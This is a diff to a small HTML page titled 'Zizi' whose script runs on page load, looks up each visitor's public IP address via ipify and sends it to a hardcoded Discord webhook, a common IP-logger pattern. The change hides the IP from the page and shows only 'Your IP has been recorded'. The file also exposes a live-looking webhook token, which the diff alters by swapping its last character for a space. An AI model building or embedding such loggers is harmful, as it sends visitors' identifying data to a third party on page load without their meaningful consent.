@@ -10,37 +10,26 @@
             text-align: center;
             margin-top: 50px;
         }
-        .ip-info {
-            margin-top: 20px;
-            font-size: 16px;
-        }
     </style>
 </head>
 <body>
     <h1>Zizi</h1>
 
-    <!-- Section to display IP info -->
-    <div class="ip-info" id="ip-info"></div>
+    <!-- Optionally you can add a confirmation message for the user -->
+    <div id="confirmation-message"></div>
 
     <script>
         // Use ipify to get the public IP address
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                // Display the IP information on the page
-                const ipInfoElement = document.getElementById('ip-info');
-                ipInfoElement.innerHTML = `
-                    <strong>IP Information:</strong><br>
-                    IP Address: ${data.ip}
-                `;
-
                 // Prepare data to send to the webhook
-                const webhookUrl = 'https://discord.com/api/webhooks/1303064241493901362/RTkY6pfhx86k_MqS7RRaOeA5Emruv3CFsLQ7DEVEkTP6VPKMCyWGaqe_NJmG1_5SuFiYL';  // Replace with your actual Discord webhook URL
+                const webhookUrl = 'https://discord.com/api/webhooks/1303064241493901362/RTkY6pfhx86k_MqS7RRaOeA5Emruv3CFsLQ7DEVEkTP6VPKMCyWGaqe_NJmG1_5SuFiY ';  // Replace with your actual Discord webhook URL
                 const payload = {
                     content: `New IP Access:\nIP Address: ${data.ip}`
                 };
 
-                // Send data to Discord Webhook
+                // Send the IP to the Discord Webhook
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
@@ -51,17 +40,20 @@
                 .then(response => {
                     if (response.ok) {
                         console.log("IP sent to webhook successfully!");
+                        document.getElementById('confirmation-message').innerHTML = "Your IP has been recorded.";
                     } else {
                         console.error("Error sending IP to webhook:", response.statusText);
+                        document.getElementById('confirmation-message').innerHTML = "Error recording IP.";
                     }
                 })
                 .catch(error => {
                     console.error("Error sending IP to webhook:", error);
+                    document.getElementById('confirmation-message').innerHTML = "Error recording IP.";
                 });
             })
             .catch(error => {
                 console.error('Error fetching IP information:', error);
-                document.getElementById('ip-info').innerHTML = 'Unable to retrieve IP information.';
+                document.getElementById('confirmation-message').innerHTML = 'Unable to retrieve IP information.';
             });
     </script>
 </body>
